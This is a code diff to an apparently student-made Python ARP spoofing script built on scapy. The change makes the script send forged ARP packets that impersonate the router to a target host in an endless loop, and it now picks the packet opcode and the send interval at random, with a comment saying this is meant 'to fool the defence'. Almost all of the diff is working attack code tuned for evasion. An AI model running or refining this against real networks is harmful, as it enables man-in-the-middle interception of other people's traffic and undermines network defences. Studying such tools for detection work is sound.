@@ -8,6 +8,8 @@ from attacker import Attacker
 from network import Network
 from color import Color #used to output to the terminals with colors
 
+from random import randint
+from random import seed
 
 def initialize():
     #get router information
@@ -94,21 +96,19 @@ if __name__ == '__main__':
     Color.pl("{+} {R} Target IP: {G}" + ip + "  {R} Target IP: {G}" + mac)
     time.sleep(2)
 
-    # create the ARP packet
-    op = 1  # Op code 1 for ARP requests
-    arp = ARP(op=op, psrc=routerIP, pdst=ip, hwdst=mac)
-
+    seed(655)
+    counter  = 0
     while 1:
+        if counter % 5 == 0:
+            '''
+            Using random to select between different types of ARP packets in order to try to fool the defence
+            Using random to select different sending intervals, the higher the sending interval the worse it is
+            '''
+            op = randint(1, 2)
+            s = randint(1, 4)
+        #creating the arp packet using scapy
+        arp = ARP(op=op, psrc=routerIP, pdst=ip, hwdst=mac)
         send(arp)
         # lower sleep timer to make it better, victim ajusts ARP table otherwise
-        time.sleep(1)
-
-
-    '''
-    Detecting router needs testing
-    
-    Optional:
-        Implement different ARP spoofing techniques that user can select
-            Changing op to 2 may be bale to make it a arp reply instead of arp who is
-                check l2.py in scapy
-    '''
+        time.sleep(s)
+        counter += 1
